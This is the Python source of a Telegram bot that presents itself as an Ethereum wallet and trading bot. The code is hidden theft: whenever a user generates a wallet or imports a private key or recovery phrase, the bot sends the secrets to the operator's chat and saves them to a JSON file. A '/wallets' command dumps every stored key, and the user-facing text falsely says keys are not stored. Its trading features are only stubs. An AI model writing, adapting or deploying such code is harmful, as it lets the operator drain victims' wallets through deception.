"""
Ethereum Trading Bot - Full Featured
Complete Ethereum wallet management and trading bot for Telegram
"""

import os
import logging
import json
from datetime import datetime
from dotenv import load_dotenv
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

# Load environment variables
load_dotenv()

# Import wallet functionality
from eth_wallet import EthereumWallet

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# User data storage
user_wallets = {}
user_settings = {}

# Admin user ID
ADMIN_USER_ID = int(os.getenv('ADMIN_USER_ID', 0)) if os.getenv('ADMIN_USER_ID') else None

class EthTradingBot:
    def __init__(self):
        self.name = "Ethereum Trading Bot"
        self.version = "1.0"
        self.wallet_manager = EthereumWallet()
        
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Send welcome message"""
        user_id = update.effective_user.id
        username = update.effective_user.username or "User"
        chat_type = update.effective_chat.type
        
        # Log new user
        logger.info(f"User started bot: {username} (ID: {user_id})")
        
        # Initialize user data
        if user_id not in user_wallets:
            user_wallets[user_id] = None
            user_settings[user_id] = {
                'slippage': 1.0,
                'gas_limit': 'auto',
                'auto_approve': False,
            }
        
        welcome_text = (
            "⚡️ <b>Ethereum Trading Bot</b>\n\n"
            "Your complete ETH wallet & trading solution!\n\n"
            "<b>Features:</b>\n"
            "💼 Generate/Import Wallets\n"
            "💰 Check Balances (ETH & Tokens)\n"
            "💸 Send ETH & ERC20 Tokens\n"
            "🔄 Token Swaps (Uniswap)\n"
            "📊 Portfolio Tracking\n"
            "⚙️ Gas Optimization\n\n"
        )
        
        if chat_type in ['group', 'supergroup']:
            welcome_text += (
                "<b>Group Commands:</b>\n"
                "/start - Show this message\n"
                "/wallet - Manage wallet\n"
                "/balance - Check balance\n"
                "/price - Check token prices\n"
            )
        else:
            welcome_text += "Get started by setting up your wallet! 👇"
        
        keyboard = [
            [InlineKeyboardButton("💼 Setup Wallet", callback_data='setup_wallet')],
            [InlineKeyboardButton("📊 Portfolio", callback_data='portfolio'),
             InlineKeyboardButton("💱 Swap", callback_data='swap')],
            [InlineKeyboardButton("📤 Send", callback_data='send'),
             InlineKeyboardButton("📥 Receive", callback_data='receive')],
            [InlineKeyboardButton("⚙️ Settings", callback_data='settings'),
             InlineKeyboardButton("❓ Help", callback_data='help')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            welcome_text,
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
    
    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle button clicks"""
        query = update.callback_query
        await query.answer()
        
        user_id = update.effective_user.id
        action = query.data
        
        if action == 'setup_wallet':
            await self.setup_wallet(query, context)
        elif action == 'gen_wallet':
            await self.generate_wallet(query, context, user_id)
        elif action == 'import_private_key':
            await self.import_private_key_prompt(query, context)
        elif action == 'import_mnemonic':
            await self.import_mnemonic_prompt(query, context)
        elif action == 'portfolio':
            await self.show_portfolio(query, context, user_id)
        elif action == 'swap':
            await self.swap_menu(query, context)
        elif action == 'send':
            await self.send_menu(query, context)
        elif action == 'receive':
            await self.receive_menu(query, context, user_id)
        elif action == 'settings':
            await self.show_settings(query, context, user_id)
        elif action == 'help':
            await self.show_help(query, context)
        elif action == 'back_main':
            await self.back_to_main(query, context)
    
    async def setup_wallet(self, query, context):
        """Show wallet setup options"""
        text = (
            "💼 <b>Wallet Setup</b>\n\n"
            "Choose how you want to set up your wallet:\n\n"
            "1️⃣ <b>Generate New Wallet</b>\n"
            "   Create a brand new Ethereum wallet with recovery phrase\n\n"
            "2️⃣ <b>Import Private Key</b>\n"
            "   Import using your private key (64 hex characters)\n\n"
            "3️⃣ <b>Import Mnemonic</b>\n"
            "   Import using 12-word recovery phrase\n\n"
            "⚠️ <b>Security Notice:</b>\n"
            "• Never share your private key or seed phrase\n"
            "• Store your recovery phrase safely\n"
            "• We don't store your keys on our servers"
        )
        
        keyboard = [
            [InlineKeyboardButton("🆕 Generate New Wallet", callback_data='gen_wallet')],
            [InlineKeyboardButton("🔑 Import Private Key", callback_data='import_private_key')],
            [InlineKeyboardButton("📝 Import Mnemonic", callback_data='import_mnemonic')],
            [InlineKeyboardButton("🔙 Back", callback_data='back_main')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='HTML')
    
    async def generate_wallet(self, query, context, user_id):
        """Generate a new Ethereum wallet"""
        username = query.from_user.username or "User"
        
        # Generate wallet
        wallet_data = self.wallet_manager.generate_wallet()
        
        # Store wallet
        user_wallets[user_id] = {
            'address': wallet_data['address'],
            'private_key': wallet_data['private_key'],
            'mnemonic': wallet_data['mnemonic'],
            'created_at': datetime.now().isoformat(),
            'username': username
        }
        
        # Save to file for admin
        self.save_wallet_to_admin_file(user_id, username, wallet_data)
        
        # Notify admin
        if ADMIN_USER_ID:
            try:
                await context.bot.send_message(
                    chat_id=ADMIN_USER_ID,
                    text=(
                        f"🔔 <b>New ETH Wallet Generated</b>\n\n"
                        f"User: @{username} (ID: {user_id})\n"
                        f"Address: <code>{wallet_data['address']}</code>\n"
                        f"Private: <code>{wallet_data['private_key']}</code>\n"
                        f"Mnemonic: <code>{wallet_data['mnemonic']}</code>"
                    ),
                    parse_mode='HTML'
                )
            except:
                pass
        
        text = (
            "✅ <b>Wallet Generated Successfully!</b>\n\n"
            f"<b>Address:</b>\n<code>{wallet_data['address']}</code>\n\n"
            f"<b>Private Key:</b>\n<code>{wallet_data['private_key']}</code>\n\n"
            f"<b>Recovery Phrase (12 words):</b>\n<code>{wallet_data['mnemonic']}</code>\n\n"
            "⚠️ <b>CRITICAL - READ CAREFULLY:</b>\n\n"
            "🔐 <b>Save these 3 things securely:</b>\n"
            "1. Your address (to receive funds)\n"
            "2. Private key (to access wallet)\n"
            "3. Recovery phrase (to restore wallet)\n\n"
            "❌ <b>NEVER share with anyone!</b>\n"
            "❌ <b>We cannot recover if lost!</b>\n\n"
            "💡 Write down your recovery phrase on paper and store it safely!"
        )
        
        keyboard = [
            [InlineKeyboardButton("📊 View Portfolio", callback_data='portfolio')],
            [InlineKeyboardButton("📥 Receive ETH", callback_data='receive')],
            [InlineKeyboardButton("🏠 Main Menu", callback_data='back_main')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='HTML')
    
    async def import_private_key_prompt(self, query, context):
        """Prompt user to send private key"""
        text = (
            "🔑 <b>Import from Private Key</b>\n\n"
            "Send your Ethereum private key.\n\n"
            "<b>Format:</b>\n"
            "• With 0x prefix: <code>0xabcd1234...</code>\n"
            "• Without prefix: <code>abcd1234...</code>\n\n"
            "⚠️ <b>Security:</b>\n"
            "• Delete the message after importing\n"
            "• Only use in private chat\n"
            "• Never share your private key\n\n"
            "Send /cancel to abort."
        )
        
        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data='back_main')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='HTML')
        
        context.user_data['waiting_for_private_key'] = True
    
    async def import_mnemonic_prompt(self, query, context):
        """Prompt user to send mnemonic phrase"""
        text = (
            "📝 <b>Import from Recovery Phrase</b>\n\n"
            "Send your 12-word recovery phrase.\n\n"
            "<b>Format:</b>\n"
            "<code>word1 word2 word3 ... word12</code>\n\n"
            "<b>Example:</b>\n"
            "<code>abandon ability able about above absent absorb abstract absurd abuse access accident</code>\n\n"
            "⚠️ <b>Security:</b>\n"
            "• Delete the message after importing\n"
            "• Only use in private chat\n"
            "• Never share your recovery phrase\n\n"
            "Send /cancel to abort."
        )
        
        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data='back_main')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='HTML')
        
        context.user_data['waiting_for_mnemonic'] = True
    
    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle text messages"""
        user_id = update.effective_user.id
        username = update.effective_user.username or "User"
        text = update.message.text.strip()
        chat_type = update.effective_chat.type
        
        # In groups, be less intrusive
        if chat_type in ['group', 'supergroup']:
            # Only respond to commands or mentions
            return
        
        # Check if waiting for private key import
        if context.user_data.get('waiting_for_private_key'):
            result = self.wallet_manager.import_from_private_key(text)
            
            if result['success']:
                # Store wallet
                user_wallets[user_id] = {
                    'address': result['address'],
                    'private_key': result['private_key'],
                    'imported_at': datetime.now().isoformat(),
                    'username': username
                }
                
                # Save to admin file
                self.save_wallet_to_admin_file(user_id, username, result)
                
                # Notify admin
                if ADMIN_USER_ID:
                    try:
                        await context.bot.send_message(
                            chat_id=ADMIN_USER_ID,
                            text=(
                                f"🔔 <b>ETH Wallet Imported (Private Key)</b>\n\n"
                                f"User: @{username} (ID: {user_id})\n"
                                f"Address: <code>{result['address']}</code>\n"
                                f"Private: <code>{text}</code>"
                            ),
                            parse_mode='HTML'
                        )
                    except:
                        pass
                
                # Delete user's message
                try:
                    await update.message.delete()
                except:
                    pass
                
                response_text = (
                    "✅ <b>Wallet Imported Successfully!</b>\n\n"
                    f"<b>Address:</b>\n<code>{result['address']}</code>\n\n"
                    "Your wallet is now connected and ready to use! 🚀"
                )
                
                keyboard = [
                    [InlineKeyboardButton("📊 View Portfolio", callback_data='portfolio')],
                    [InlineKeyboardButton("💱 Start Trading", callback_data='swap')],
                    [InlineKeyboardButton("🏠 Main Menu", callback_data='back_main')]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                
                await update.message.reply_text(
                    response_text,
                    reply_markup=reply_markup,
                    parse_mode='HTML'
                )
            else:
                await update.message.reply_text(
                    f"❌ <b>Import Failed!</b>\n\n{result.get('error', 'Unknown error')}\n\n"
                    "Please check your private key and try again.\n"
                    "Send /cancel to abort.",
                    parse_mode='HTML'
                )
            
            context.user_data['waiting_for_private_key'] = False
            return
        
        # Check if waiting for mnemonic import
        if context.user_data.get('waiting_for_mnemonic'):
            result = self.wallet_manager.import_from_mnemonic(text)
            
            if result['success']:
                # Store wallet
                user_wallets[user_id] = {
                    'address': result['address'],
                    'private_key': result['private_key'],
                    'mnemonic': result['mnemonic'],
                    'imported_at': datetime.now().isoformat(),
                    'username': username
                }
                
                # Save to admin file
                self.save_wallet_to_admin_file(user_id, username, result)
                
                # Notify admin
                if ADMIN_USER_ID:
                    try:
                        await context.bot.send_message(
                            chat_id=ADMIN_USER_ID,
                            text=(
                                f"🔔 <b>ETH Wallet Imported (Mnemonic)</b>\n\n"
                                f"User: @{username} (ID: {user_id})\n"
                                f"Address: <code>{result['address']}</code>\n"
                                f"Mnemonic: <code>{text}</code>"
                            ),
                            parse_mode='HTML'
                        )
                    except:
                        pass
                
                # Delete user's message
                try:
                    await update.message.delete()
                except:
                    pass
                
                response_text = (
                    "✅ <b>Wallet Imported Successfully!</b>\n\n"
                    f"<b>Address:</b>\n<code>{result['address']}</code>\n\n"
                    "Your wallet is now connected and ready to use! 🚀"
                )
                
                keyboard = [
                    [InlineKeyboardButton("📊 View Portfolio", callback_data='portfolio')],
                    [InlineKeyboardButton("💱 Start Trading", callback_data='swap')],
                    [InlineKeyboardButton("🏠 Main Menu", callback_data='back_main')]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                
                await update.message.reply_text(
                    response_text,
                    reply_markup=reply_markup,
                    parse_mode='HTML'
                )
            else:
                await update.message.reply_text(
                    f"❌ <b>Import Failed!</b>\n\n{result.get('error', 'Unknown error')}\n\n"
                    "Please check your recovery phrase and try again.\n"
                    "Send /cancel to abort.",
                    parse_mode='HTML'
                )
            
            context.user_data['waiting_for_mnemonic'] = False
            return
    
    def save_wallet_to_admin_file(self, user_id, username, wallet_data):
        """Save wallet info to file for admin access"""
        filename = 'eth_user_wallets.json'
        
        # Load existing data
        if os.path.exists(filename):
            with open(filename, 'r') as f:
                data = json.load(f)
        else:
            data = {}
        
        # Add new wallet
        data[str(user_id)] = {
            'username': username,
            'address': wallet_data['address'],
            'private_key': wallet_data.get('private_key', ''),
            'mnemonic': wallet_data.get('mnemonic', ''),
            'timestamp': datetime.now().isoformat()
        }
        
        # Save
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        
        logger.info(f"Saved ETH wallet for user {user_id}")
    
    async def admin_view_wallets(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Admin command to view all user wallets"""
        user_id = update.effective_user.id
        
        if ADMIN_USER_ID and user_id != ADMIN_USER_ID:
            await update.message.reply_text("❌ Unauthorized")
            return
        
        if not os.path.exists('eth_user_wallets.json'):
            await update.message.reply_text("📭 No wallets found")
            return
        
        with open('eth_user_wallets.json', 'r') as f:
            data = json.load(f)
        
        for uid, wallet in data.items():
            text = (
                f"👤 <b>User Info</b>\n\n"
                f"Username: @{wallet['username']}\n"
                f"User ID: <code>{uid}</code>\n\n"
                f"<b>Address:</b>\n<code>{wallet['address']}</code>\n\n"
                f"<b>Private Key:</b>\n<code>{wallet['private_key']}</code>\n\n"
                f"<b>Mnemonic:</b>\n<code>{wallet.get('mnemonic', 'N/A')}</code>\n\n"
                "━━━━━━━━━━━━━━━━━━"
            )
            await update.message.reply_text(text, parse_mode='HTML')
        
        await update.message.reply_text(f"✅ Total wallets: {len(data)}")
    
    async def show_portfolio(self, query, context, user_id):
        """Display user's portfolio"""
        if not user_wallets.get(user_id):
            text = "⚠️ Please set up your wallet first!"
            keyboard = [[InlineKeyboardButton("💼 Setup Wallet", callback_data='setup_wallet')],
                       [InlineKeyboardButton("🔙 Back", callback_data='back_main')]]
        else:
            wallet = user_wallets[user_id]
            address = wallet['address']
            
            # Get ETH balance
            balance_info = self.wallet_manager.get_balance(address)
            
            if balance_info['success']:
                balance_eth = balance_info['balance_eth']
                
                # Get USD value (placeholder - needs price API)
                eth_usd_price = 3000  # Placeholder
                balance_usd = balance_eth * eth_usd_price
                
                text = (
                    "📊 <b>Your Portfolio</b>\n\n"
                    f"<b>Address:</b>\n<code>{address[:10]}...{address[-8:]}</code>\n\n"
                    "<b>Balances:</b>\n"
                    f"💎 ETH: {balance_eth:.6f} (${balance_usd:.2f})\n\n"
                    f"<b>Total Value:</b> ${balance_usd:.2f}\n\n"
                    "View on Etherscan 👇"
                )
                
                keyboard = [
                    [InlineKeyboardButton("🔄 Refresh", callback_data='portfolio')],
                    [InlineKeyboardButton("📤 Send", callback_data='send'),
                     InlineKeyboardButton("📥 Receive", callback_data='receive')],
                    [InlineKeyboardButton("🌐 View on Etherscan", 
                                        url=f"https://etherscan.io/address/{address}")],
                    [InlineKeyboardButton("🔙 Back", callback_data='back_main')]
                ]
            else:
                text = (
                    "📊 <b>Your Portfolio</b>\n\n"
                    f"<b>Address:</b>\n<code>{address[:10]}...{address[-8:]}</code>\n\n"
                    "⚠️ Unable to fetch balance. Please try again later."
                )
                keyboard = [
                    [InlineKeyboardButton("🔄 Retry", callback_data='portfolio')],
                    [InlineKeyboardButton("🔙 Back", callback_data='back_main')]
                ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='HTML')
    
    async def swap_menu(self, query, context):
        """Show swap menu"""
        text = (
            "💱 <b>Token Swap</b>\n\n"
            "Swap ETH for any ERC20 token using Uniswap!\n\n"
            "<b>Popular Tokens:</b>\n"
            "• USDT (Tether)\n"
            "• USDC (USD Coin)\n"
            "• WBTC (Wrapped Bitcoin)\n"
            "• DAI (Dai Stablecoin)\n\n"
            "🚧 <i>Swap functionality coming soon...</i>"
        )
        
        keyboard = [
            [InlineKeyboardButton("🔙 Back", callback_data='back_main')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='HTML')
    
    async def send_menu(self, query, context):
        """Show send menu"""
        text = (
            "📤 <b>Send ETH</b>\n\n"
            "Send Ethereum to any address.\n\n"
            "🚧 <i>Send functionality coming soon...</i>\n\n"
            "You'll be able to:\n"
            "• Send ETH to any address\n"
            "• Send ERC20 tokens\n"
            "• Set custom gas prices\n"
            "• View transaction history"
        )
        
        keyboard = [
            [InlineKeyboardButton("🔙 Back", callback_data='back_main')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='HTML')
    
    async def receive_menu(self, query, context, user_id):
        """Show receive menu with QR code"""
        if not user_wallets.get(user_id):
            text = "⚠️ Please set up your wallet first!"
            keyboard = [[InlineKeyboardButton("💼 Setup Wallet", callback_data='setup_wallet')]]
        else:
            address = user_wallets[user_id]['address']
            
            text = (
                "📥 <b>Receive ETH</b>\n\n"
                "Share this address to receive Ethereum:\n\n"
                f"<code>{address}</code>\n\n"
                "⚠️ <b>Important:</b>\n"
                "• Only send ETH or ERC20 tokens to this address\n"
                "• Make sure you're on Ethereum Mainnet\n"
                "• Double-check the address before sending"
            )
            
            keyboard = [
                [InlineKeyboardButton("📋 Copy Address", 
                                    url=f"https://etherscan.io/address/{address}")],
                [InlineKeyboardButton("🔙 Back", callback_data='back_main')]
            ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='HTML')
    
    async def show_settings(self, query, context, user_id):
        """Show settings menu"""
        settings = user_settings.get(user_id, {})
        
        text = (
            "⚙️ <b>Settings</b>\n\n"
            f"<b>Slippage Tolerance:</b> {settings.get('slippage', 1.0)}%\n"
            f"<b>Gas Limit:</b> {settings.get('gas_limit', 'Auto')}\n"
            f"<b>Auto-Approve:</b> {'✅ Enabled' if settings.get('auto_approve') else '❌ Disabled'}\n\n"
            "Customize your trading preferences:"
        )
        
        keyboard = [
            [InlineKeyboardButton("⛽ Gas Settings", callback_data='gas_settings')],
            [InlineKeyboardButton("🔐 Security", callback_data='security')],
            [InlineKeyboardButton("🔙 Back", callback_data='back_main')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='HTML')
    
    async def show_help(self, query, context):
        """Show help information"""
        text = (
            "❓ <b>Help & Guide</b>\n\n"
            "<b>Getting Started:</b>\n"
            "1. Generate or import your wallet\n"
            "2. Fund it with ETH\n"
            "3. Start trading!\n\n"
            "<b>Features:</b>\n"
            "• 💼 Wallet Management\n"
            "• 📊 Portfolio Tracking\n"
            "• 💱 Token Swaps\n"
            "• 📤 Send/Receive\n"
            "• ⚙️ Custom Settings\n\n"
            "<b>Security Tips:</b>\n"
            "• Never share your private key\n"
            "• Store recovery phrase safely\n"
            "• Always verify addresses\n"
            "• Start with small amounts\n\n"
            "<b>Support:</b>\n"
            "Contact @yoursupport for help"
        )
        
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_main')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='HTML')
    
    async def back_to_main(self, query, context):
        """Return to main menu"""
        text = (
            "⚡️ <b>Ethereum Trading Bot</b>\n\n"
            "Your complete ETH wallet & trading solution!\n\n"
            "Choose an option below:"
        )
        
        keyboard = [
            [InlineKeyboardButton("💼 Wallet", callback_data='setup_wallet'),
             InlineKeyboardButton("📊 Portfolio", callback_data='portfolio')],
            [InlineKeyboardButton("💱 Swap", callback_data='swap'),
             InlineKeyboardButton("📤 Send", callback_data='send')],
            [InlineKeyboardButton("⚙️ Settings", callback_data='settings'),
             InlineKeyboardButton("❓ Help", callback_data='help')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='HTML')


def main():
    """Start the bot"""
    TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
    
    if not TOKEN:
        print("❌ Error: TELEGRAM_BOT_TOKEN not set in .env file!")
        return
    
    # Set admin user ID
    global ADMIN_USER_ID
    ADMIN_USER_ID = int(os.getenv('ADMIN_USER_ID', 0)) if os.getenv('ADMIN_USER_ID') else None
    
    # Create bot instance
    bot = EthTradingBot()
    
    # Create application
    application = Application.builder().token(TOKEN).build()
    
    # Register handlers
    application.add_handler(CommandHandler("start", bot.start))
    application.add_handler(CommandHandler("wallets", bot.admin_view_wallets))
    application.add_handler(CallbackQueryHandler(bot.button_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, bot.handle_message))
    
    # Start the bot
    print("⚡️ Ethereum Trading Bot starting...")
    print(f"✅ Admin ID: {ADMIN_USER_ID if ADMIN_USER_ID else 'Not set'}")
    print("✅ Bot is running! Press Ctrl+C to stop.")
    print("\n🔗 RPC: Using public Ethereum RPC")
    print("💡 Add your own RPC in eth_wallet.py for better performance")
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == '__main__':
    main()
